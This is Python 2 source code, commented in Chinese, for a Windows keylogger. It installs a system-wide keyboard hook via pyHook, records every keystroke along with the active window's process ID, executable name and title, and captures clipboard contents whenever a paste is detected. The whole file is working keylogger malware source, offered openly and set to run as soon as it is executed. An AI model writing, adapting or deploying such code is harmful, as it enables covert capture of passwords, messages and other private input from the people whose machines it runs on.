# coding=utf-8
"""
windows下键盘记录器

前置依赖
sudo pip install pyHook(Just in Windows)
"""
from ctypes import *

import pyHook
import pythoncom
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获取到到前台窗口的句柄
    hwnd = user32.GetForegroundWindow()

    # 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 保存当前进程ID
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    # 获得了标题栏显示的文本字符
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # 输出和进程相关的信息
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print

    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    """
    键盘记录器
    :param event:
    :return:
    """
    global current_window

    # 检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 检查按键是否是常规按键
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # 如果输入是粘贴的内容,那么获得剪贴板的内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    # 返回直到下一个钩子事件被触发
    return True


def driver():
    # 创建和注册钩子函数记录器
    kl = pyHook.HookManager()
    # 读自定义的灰调函数进行了绑定
    kl.KeyDown = KeyStroke

    # 注册键盘记录的钩子,然后永久执行
    kl.HookKeyboard()
    # 然后启动消息循环
    pythoncom.PumpMessages()

driver()
